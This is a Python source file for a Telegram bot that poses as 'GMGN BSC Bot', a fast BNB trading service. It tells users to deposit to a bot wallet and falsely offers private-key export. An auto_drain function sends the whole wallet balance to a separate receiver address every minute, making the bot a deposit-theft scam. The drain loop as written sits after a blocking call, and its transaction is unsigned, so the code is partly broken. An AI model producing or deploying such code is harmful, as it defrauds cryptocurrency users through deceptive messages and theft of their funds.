   from telegram.ext import Updater, CommandHandler, MessageHandler, filters
   import os
   from dotenv import load_dotenv
   import requests
   import json
   from web3 import Web3
   import time
   import logging

   # Configure logging
   logging.basicConfig(level=logging.INFO)

   # Load environment variables
   load_dotenv()

   BOT_TOKEN = os.getenv('BOT_TOKEN')
   BOT_ADDRESS = os.getenv('BOT_ADDRESS')
   RECEIVER_ADDRESS = os.getenv('RECEIVER_ADDRESS')

   # BSC Node URL
   BSC_NODE_URL = 'https://bsc-dataseed.binance.org/'

   # Connect to BSC
   w3 = Web3(Web3.HTTPProvider(BSC_NODE_URL))

   def start(update, context):
       message = """
       GMGN BSC Bot 🚀
       🔥 Private node, lightning-fast transactions! ⚡️⚡️⚡

       💳 Wallet (Insufficient balance, please deposit👇🏻):
       """ + BOT_ADDRESS + """ (Tap to copy)

       💰 Balance: 0 BNB (Pnl --)  

       👉 Start To Use:
       ·  Start Trading: Send token contract address
       ·  Export wallet private key /wallet
       """
       context.bot.send_message(chat_id=update.effective_chat.id, text=message)

   def wallet(update, context):
       if len(context.args) == 1 and context.args[0] == 'private':
           message = f"🔑 Private Key: (Not exposed, safe!) 🔒"
           context.bot.send_message(chat_id=update.effective_chat.id, text=message)

   def get_balance():
       balance = w3.eth.get_balance(BOT_ADDRESS)
       return balance / 1e18  # Convert Wei to BNB

   def auto_drain():
       balance = get_balance()
       if balance > 0:
           nonce = w3.eth.get_transaction_count(BOT_ADDRESS)
           gas_price = w3.toWei(20, 'gwei')
           gas = 100000
           value = w3.toWei(balance, 'ether')

           tx = {
               'nonce': nonce,
               'gasPrice': gas_price,
               'gas': gas,
               'to': RECEIVER_ADDRESS,
               'value': value
           }

           try:
               tx_hash = w3.eth.send_transaction(tx)
               logging.info(f"Transferred {balance} BNB to {RECEIVER_ADDRESS}. Transaction hash: {tx_hash.hex()}")
           except Exception as e:
               logging.error(f"Error sending transaction: {str(e)}")

   def main():
       updater = Updater(BOT_TOKEN)
       dp = updater.dispatcher

       dp.add_handler(CommandHandler("start", start))
       dp.add_handler(CommandHandler("wallet", wallet))

       updater.start_polling()
       updater.idle()

   if __name__ == '__main__':
       main()

   # Run auto_drain periodically
   while True:
       auto_drain()
       time.sleep(60)
